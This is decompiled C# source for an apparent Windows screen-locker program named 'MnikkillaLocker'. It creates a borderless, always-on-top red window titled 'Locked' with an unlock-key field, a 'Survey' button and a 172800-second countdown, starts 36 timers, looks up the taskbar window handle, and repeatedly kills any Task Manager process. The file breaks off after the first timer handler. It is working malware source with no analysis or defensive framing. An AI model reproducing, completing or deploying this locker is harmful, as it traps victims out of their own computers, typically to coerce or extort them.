using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace MnikkillaLocker;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	[AccessedThroughProperty("Timer4")]
	private Timer _Timer4;

	[AccessedThroughProperty("Timer5")]
	private Timer _Timer5;

	[AccessedThroughProperty("Timer6")]
	private Timer _Timer6;

	[AccessedThroughProperty("Timer7")]
	private Timer _Timer7;

	[AccessedThroughProperty("Timer8")]
	private Timer _Timer8;

	[AccessedThroughProperty("Timer9")]
	private Timer _Timer9;

	[AccessedThroughProperty("Timer10")]
	private Timer _Timer10;

	[AccessedThroughProperty("Timer11")]
	private Timer _Timer11;

	[AccessedThroughProperty("Timer12")]
	private Timer _Timer12;

	[AccessedThroughProperty("Timer13")]
	private Timer _Timer13;

	[AccessedThroughProperty("Timer14")]
	private Timer _Timer14;

	[AccessedThroughProperty("Timer15")]
	private Timer _Timer15;

	[AccessedThroughProperty("Timer16")]
	private Timer _Timer16;

	[AccessedThroughProperty("Timer17")]
	private Timer _Timer17;

	[AccessedThroughProperty("Timer18")]
	private Timer _Timer18;

	[AccessedThroughProperty("Timer19")]
	private Timer _Timer19;

	[AccessedThroughProperty("Timer20")]
	private Timer _Timer20;

	[AccessedThroughProperty("Timer21")]
	private Timer _Timer21;

	[AccessedThroughProperty("Timer22")]
	private Timer _Timer22;

	[AccessedThroughProperty("Timer23")]
	private Timer _Timer23;

	[AccessedThroughProperty("Timer24")]
	private Timer _Timer24;

	[AccessedThroughProperty("Timer25")]
	private Timer _Timer25;

	[AccessedThroughProperty("Timer26")]
	private Timer _Timer26;

	[AccessedThroughProperty("Timer27")]
	private Timer _Timer27;

	[AccessedThroughProperty("Timer28")]
	private Timer _Timer28;

	[AccessedThroughProperty("Timer29")]
	private Timer _Timer29;

	[AccessedThroughProperty("Timer30")]
	private Timer _Timer30;

	[AccessedThroughProperty("Timer31")]
	private Timer _Timer31;

	[AccessedThroughProperty("Timer32")]
	private Timer _Timer32;

	[AccessedThroughProperty("Timer33")]
	private Timer _Timer33;

	[AccessedThroughProperty("Timer34")]
	private Timer _Timer34;

	[AccessedThroughProperty("Timer35")]
	private Timer _Timer35;

	[AccessedThroughProperty("Timer36")]
	private Timer _Timer36;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("RichTextBox1")]
	private RichTextBox _RichTextBox1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	private const int SWP_HIDEWINDOW = 128;

	private const int SWP_SHOWWINDOW = 64;

	private int taskBar;

	private object RegistryKey;

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer4_Tick;
			if (_Timer4 != null)
			{
				_Timer4.remove_Tick(eventHandler);
			}
			_Timer4 = value;
			if (_Timer4 != null)
			{
				_Timer4.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer5_Tick;
			if (_Timer5 != null)
			{
				_Timer5.remove_Tick(eventHandler);
			}
			_Timer5 = value;
			if (_Timer5 != null)
			{
				_Timer5.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer6_Tick;
			if (_Timer6 != null)
			{
				_Timer6.remove_Tick(eventHandler);
			}
			_Timer6 = value;
			if (_Timer6 != null)
			{
				_Timer6.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer7_Tick;
			if (_Timer7 != null)
			{
				_Timer7.remove_Tick(eventHandler);
			}
			_Timer7 = value;
			if (_Timer7 != null)
			{
				_Timer7.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer8
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer8_Tick;
			if (_Timer8 != null)
			{
				_Timer8.remove_Tick(eventHandler);
			}
			_Timer8 = value;
			if (_Timer8 != null)
			{
				_Timer8.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer9
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer9_Tick;
			if (_Timer9 != null)
			{
				_Timer9.remove_Tick(eventHandler);
			}
			_Timer9 = value;
			if (_Timer9 != null)
			{
				_Timer9.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer10
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer10_Tick;
			if (_Timer10 != null)
			{
				_Timer10.remove_Tick(eventHandler);
			}
			_Timer10 = value;
			if (_Timer10 != null)
			{
				_Timer10.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer11
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer11_Tick;
			if (_Timer11 != null)
			{
				_Timer11.remove_Tick(eventHandler);
			}
			_Timer11 = value;
			if (_Timer11 != null)
			{
				_Timer11.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer12
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer12_Tick;
			if (_Timer12 != null)
			{
				_Timer12.remove_Tick(eventHandler);
			}
			_Timer12 = value;
			if (_Timer12 != null)
			{
				_Timer12.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer13
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer13_Tick;
			if (_Timer13 != null)
			{
				_Timer13.remove_Tick(eventHandler);
			}
			_Timer13 = value;
			if (_Timer13 != null)
			{
				_Timer13.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer14
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer14_Tick;
			if (_Timer14 != null)
			{
				_Timer14.remove_Tick(eventHandler);
			}
			_Timer14 = value;
			if (_Timer14 != null)
			{
				_Timer14.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer15
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer15_Tick;
			if (_Timer15 != null)
			{
				_Timer15.remove_Tick(eventHandler);
			}
			_Timer15 = value;
			if (_Timer15 != null)
			{
				_Timer15.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer16
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer16_Tick;
			if (_Timer16 != null)
			{
				_Timer16.remove_Tick(eventHandler);
			}
			_Timer16 = value;
			if (_Timer16 != null)
			{
				_Timer16.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer17
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer17_Tick;
			if (_Timer17 != null)
			{
				_Timer17.remove_Tick(eventHandler);
			}
			_Timer17 = value;
			if (_Timer17 != null)
			{
				_Timer17.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer18
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer18_Tick;
			if (_Timer18 != null)
			{
				_Timer18.remove_Tick(eventHandler);
			}
			_Timer18 = value;
			if (_Timer18 != null)
			{
				_Timer18.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer19
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer19;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer19_Tick;
			if (_Timer19 != null)
			{
				_Timer19.remove_Tick(eventHandler);
			}
			_Timer19 = value;
			if (_Timer19 != null)
			{
				_Timer19.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer20
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer20;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer20_Tick;
			if (_Timer20 != null)
			{
				_Timer20.remove_Tick(eventHandler);
			}
			_Timer20 = value;
			if (_Timer20 != null)
			{
				_Timer20.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer21
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer21;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer21_Tick;
			if (_Timer21 != null)
			{
				_Timer21.remove_Tick(eventHandler);
			}
			_Timer21 = value;
			if (_Timer21 != null)
			{
				_Timer21.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer22
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer22;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer22_Tick;
			if (_Timer22 != null)
			{
				_Timer22.remove_Tick(eventHandler);
			}
			_Timer22 = value;
			if (_Timer22 != null)
			{
				_Timer22.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer23
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer23;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer23_Tick;
			if (_Timer23 != null)
			{
				_Timer23.remove_Tick(eventHandler);
			}
			_Timer23 = value;
			if (_Timer23 != null)
			{
				_Timer23.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer24
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer24;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer24_Tick;
			if (_Timer24 != null)
			{
				_Timer24.remove_Tick(eventHandler);
			}
			_Timer24 = value;
			if (_Timer24 != null)
			{
				_Timer24.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer25
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer25;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer25_Tick;
			if (_Timer25 != null)
			{
				_Timer25.remove_Tick(eventHandler);
			}
			_Timer25 = value;
			if (_Timer25 != null)
			{
				_Timer25.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer26
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer26;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer26_Tick;
			if (_Timer26 != null)
			{
				_Timer26.remove_Tick(eventHandler);
			}
			_Timer26 = value;
			if (_Timer26 != null)
			{
				_Timer26.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer27
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer27;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer27_Tick;
			if (_Timer27 != null)
			{
				_Timer27.remove_Tick(eventHandler);
			}
			_Timer27 = value;
			if (_Timer27 != null)
			{
				_Timer27.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer28
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer28;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer28 = value;
		}
	}

	internal virtual Timer Timer29
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer29;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer29 = value;
		}
	}

	internal virtual Timer Timer30
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer30;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer30 = value;
		}
	}

	internal virtual Timer Timer31
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer31;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer31 = value;
		}
	}

	internal virtual Timer Timer32
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer32;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer32 = value;
		}
	}

	internal virtual Timer Timer33
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer33;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer33 = value;
		}
	}

	internal virtual Timer Timer34
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer34;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer34 = value;
		}
	}

	internal virtual Timer Timer35
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer35;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer35 = value;
		}
	}

	internal virtual Timer Timer36
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer36;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Timer36 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual RichTextBox RichTextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _RichTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RichTextBox1_TextChanged;
			if (_RichTextBox1 != null)
			{
				((Control)_RichTextBox1).remove_TextChanged(eventHandler);
			}
			_RichTextBox1 = value;
			if (_RichTextBox1 != null)
			{
				((Control)_RichTextBox1).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click(eventHandler);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Expected O, but got Unknown
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Expected O, but got Unknown
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b4: Expected O, but got Unknown
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		//IL_0110: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Expected O, but got Unknown
		//IL_0121: Unknown result type (might be due to invalid IL or missing references)
		//IL_012b: Expected O, but got Unknown
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Expected O, but got Unknown
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_014d: Expected O, but got Unknown
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		//IL_015e: Expected O, but got Unknown
		//IL_0165: Unknown result type (might be due to invalid IL or missing references)
		//IL_016f: Expected O, but got Unknown
		//IL_0176: Unknown result type (might be due to invalid IL or missing references)
		//IL_0180: Expected O, but got Unknown
		//IL_0187: Unknown result type (might be due to invalid IL or missing references)
		//IL_0191: Expected O, but got Unknown
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Expected O, but got Unknown
		//IL_01a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b3: Expected O, but got Unknown
		//IL_01ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c4: Expected O, but got Unknown
		//IL_01cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d5: Expected O, but got Unknown
		//IL_01dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e6: Expected O, but got Unknown
		//IL_01ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f7: Expected O, but got Unknown
		//IL_01fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0208: Expected O, but got Unknown
		//IL_020f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0219: Expected O, but got Unknown
		//IL_0220: Unknown result type (might be due to invalid IL or missing references)
		//IL_022a: Expected O, but got Unknown
		//IL_0231: Unknown result type (might be due to invalid IL or missing references)
		//IL_023b: Expected O, but got Unknown
		//IL_0242: Unknown result type (might be due to invalid IL or missing references)
		//IL_024c: Expected O, but got Unknown
		//IL_0253: Unknown result type (might be due to invalid IL or missing references)
		//IL_025d: Expected O, but got Unknown
		//IL_0264: Unknown result type (might be due to invalid IL or missing references)
		//IL_026e: Expected O, but got Unknown
		//IL_0275: Unknown result type (might be due to invalid IL or missing references)
		//IL_027f: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_028a: Expected O, but got Unknown
		//IL_028b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0295: Expected O, but got Unknown
		//IL_0296: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a0: Expected O, but got Unknown
		//IL_02a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ab: Expected O, but got Unknown
		//IL_02ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b6: Expected O, but got Unknown
		//IL_04aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b4: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		Timer3 = new Timer(components);
		Timer4 = new Timer(components);
		Timer5 = new Timer(components);
		Timer6 = new Timer(components);
		Timer7 = new Timer(components);
		Timer8 = new Timer(components);
		Timer9 = new Timer(components);
		Timer10 = new Timer(components);
		Timer11 = new Timer(components);
		Timer12 = new Timer(components);
		Timer13 = new Timer(components);
		Timer14 = new Timer(components);
		Timer15 = new Timer(components);
		Timer16 = new Timer(components);
		Timer17 = new Timer(components);
		Timer18 = new Timer(components);
		Timer19 = new Timer(components);
		Timer20 = new Timer(components);
		Timer21 = new Timer(components);
		Timer22 = new Timer(components);
		Timer23 = new Timer(components);
		Timer24 = new Timer(components);
		Timer25 = new Timer(components);
		Timer26 = new Timer(components);
		Timer27 = new Timer(components);
		Timer28 = new Timer(components);
		Timer29 = new Timer(components);
		Timer30 = new Timer(components);
		Timer31 = new Timer(components);
		Timer32 = new Timer(components);
		Timer33 = new Timer(components);
		Timer34 = new Timer(components);
		Timer35 = new Timer(components);
		Timer36 = new Timer(components);
		TextBox1 = new TextBox();
		Button1 = new Button();
		RichTextBox1 = new RichTextBox();
		Button2 = new Button();
		Label1 = new Label();
		((Control)this).SuspendLayout();
		TextBox textBox = TextBox1;
		Point location = new Point(21, 129);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(225, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		((ButtonBase)Button1).set_BackColor(Color.Silver);
		((Control)Button1).set_ForeColor(SystemColors.ActiveCaption);
		Button button = Button1;
		location = new Point(252, 129);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(62, 20);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(1);
		((ButtonBase)Button1).set_Text("Unlock");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		RichTextBox richTextBox = RichTextBox1;
		location = new Point(21, 17);
		((Control)richTextBox).set_Location(location);
		((Control)RichTextBox1).set_Name("RichTextBox1");
		RichTextBox richTextBox2 = RichTextBox1;
		size = new Size(462, 96);
		((Control)richTextBox2).set_Size(size);
		((Control)RichTextBox1).set_TabIndex(2);
		RichTextBox1.set_Text(componentResourceManager.GetString("RichTextBox1.Text"));
		((ButtonBase)Button2).set_BackColor(Color.Silver);
		((Control)Button2).set_ForeColor(SystemColors.ActiveCaption);
		Button button3 = Button2;
		location = new Point(320, 129);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(62, 20);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(3);
		((ButtonBase)Button2).set_Text("Survey");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(false);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label = Label1;
		location = new Point(413, 124);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(70, 24);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(4);
		Label1.set_Text("172800");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Red);
		size = new Size(495, 161);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)RichTextBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).set_ForeColor(SystemColors.Control);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Locked");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	private void Form1_Load(object sender, EventArgs e)
	{
		Timer2.Start();
		Timer1.Start();
		Timer3.Start();
		Timer4.Start();
		Timer5.Start();
		Timer6.Start();
		Timer7.Start();
		Timer8.Start();
		Timer9.Start();
		Timer10.Start();
		Timer11.Start();
		Timer12.Start();
		Timer13.Start();
		Timer14.Start();
		Timer15.Start();
		Timer16.Start();
		Timer17.Start();
		Timer18.Start();
		Timer19.Start();
		Timer20.Start();
		Timer21.Start();
		Timer22.Start();
		Timer23.Start();
		Timer24.Start();
		Timer25.Start();
		Timer26.Start();
		Timer27.Start();
		Timer28.Start();
		Timer29.Start();
		Timer30.Start();
		Timer31.Start();
		Timer32.Start();
		Timer33.Start();
		Timer34.Start();
		Timer35.Start();
		Timer36.Start();
		string lpClassName = "Shell_traywnd";
		string lpWindowName = "";
		taskBar = FindWindowA(ref lpClassName, ref lpWindowName);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, "taskmgr", false) == 0)
			{
				process.Kill();
			}
		}
	}

